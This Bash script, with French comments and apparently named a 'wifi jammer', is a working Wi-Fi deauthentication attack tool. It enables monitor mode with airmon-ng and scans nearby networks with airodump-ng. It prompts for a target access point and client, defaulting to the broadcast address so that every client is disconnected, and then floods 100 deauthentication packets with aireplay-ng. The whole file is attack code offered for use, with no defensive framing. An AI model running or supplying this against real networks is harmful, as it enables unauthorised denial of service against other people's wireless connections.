#!/bin/bash

set -euo pipefail

# V√©rifier si l'utilisateur est root
if [[ $EUID -ne 0 ]]; then
    echo "[‚ùå] Ce script doit √™tre ex√©cut√© en root."
    exit 1
fi

# Configuration du logging
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_DIR="$SCRIPT_DIR/logs"
LOG_FILE="$LOG_DIR/wifi_jammer.log"

mkdir -p "$LOG_DIR"
echo "" > "$LOG_FILE"

log() {
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] $1" | tee -a "$LOG_FILE"
}

# V√©rifier la configuration
CONFIG_FILE="$SCRIPT_DIR/config.json"
if [[ ! -f "$CONFIG_FILE" ]]; then
    log "[‚ùå] Fichier config.json non trouv√© !"
    exit 1
fi

# Charger les param√®tres depuis config.json
WIFI_IFACE=$(jq -r '.wifi_interface' "$CONFIG_FILE")
MONITOR_SUPPORTED=$(jq -r '.monitor_supported' "$CONFIG_FILE")

if [[ -z "$WIFI_IFACE" || "$WIFI_IFACE" == "null" ]]; then
    log "[‚ùå] Interface Wi-Fi non configur√©e dans config.json"
    exit 1
fi

if [[ "$MONITOR_SUPPORTED" != "true" ]]; then
    log "[‚ö†Ô∏è] L'interface $WIFI_IFACE ne supporte pas le mode monitor. L'attaque pourrait √©chouer."
    read -p "Voulez-vous continuer quand m√™me ? (o/N) " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Oo]$ ]]; then
        exit 1
    fi
fi

log "[‚úÖ] Interface d√©tect√©e : $WIFI_IFACE"

# Activer le mode monitor si n√©cessaire
if ! iw dev "$WIFI_IFACE" info | grep -q "type monitor"; then
    log "[‚ÑπÔ∏è] Activation du mode monitor sur $WIFI_IFACE..."
    airmon-ng start "$WIFI_IFACE"
    WIFI_IFACE="${WIFI_IFACE}mon"
    log "[‚úÖ] Mode monitor activ√© : $WIFI_IFACE"
fi

# Dossier des captures
CAPTURE_DIR="$SCRIPT_DIR/captures"
mkdir -p "$CAPTURE_DIR"

# Scan des r√©seaux Wi-Fi
log "[üîç] Scan des r√©seaux Wi-Fi en cours..."
airodump-ng --output-format csv -w "$CAPTURE_DIR/networks" "$WIFI_IFACE" --write-interval 1 &> /dev/null &

# Attendre un peu pour collecter des donn√©es
sleep 7

# Arr√™ter le scan
pkill airodump-ng

# V√©rifier la pr√©sence du fichier
SCAN_FILE="$CAPTURE_DIR/networks-01.csv"
if [[ ! -f "$SCAN_FILE" ]]; then
    log "[‚ùå] Aucun r√©seau d√©tect√© !"
    exit 1
fi

# Afficher les r√©seaux d√©tect√©s
log "üì° R√©seaux Wi-Fi d√©tect√©s :"
awk -F',' '
NR>2 {
    ssid=$14
    canal=$4
    bssid=$1
    encryption=$6

    if (encryption ~ /WPA3/) {
        security="WPA3"
    } else if (encryption ~ /WPA2/) {
        security="WPA2"
    } else if (encryption ~ /WPA/) {
        security="WPA"
    } else if (encryption ~ /WEP/) {
        security="WEP"
    } else {
        security="OPEN"
    }

    printf "BSSID: %-20s | Canal: %-3s | S√©curit√©: %-4s | SSID: %s\n", bssid, canal, security, ssid
}' "$SCAN_FILE" | column -t

# Demander √† l'utilisateur de choisir une cible
read -p "üì° Entrez le BSSID de la cible : " TARGET_BSSID
read -p "üì° Entrez le num√©ro du canal de la cible : " TARGET_CHANNEL

# Passer en mode √©coute sur le bon canal
iw dev "$WIFI_IFACE" set channel "$TARGET_CHANNEL"

# Demander si on cible un client sp√©cifique
read -p "Voulez-vous cibler un client sp√©cifique ? (o/N) " -n 1 -r
echo
if [[ $REPLY =~ ^[Oo]$ ]]; then
    read -p "üì° Entrez l'adresse MAC du client (ou FF:FF:FF:FF:FF:FF pour tout d√©connecter) : " CLIENT_MAC
else
    CLIENT_MAC="FF:FF:FF:FF:FF:FF"
fi

# Lancer l'attaque de d√©sauthentification
log "[‚ö°] Envoi de paquets de d√©sauthentification..."
aireplay-ng --deauth 100 -a "$TARGET_BSSID" -c "$CLIENT_MAC" "$WIFI_IFACE"

log "[‚úÖ] Attaque termin√©e."
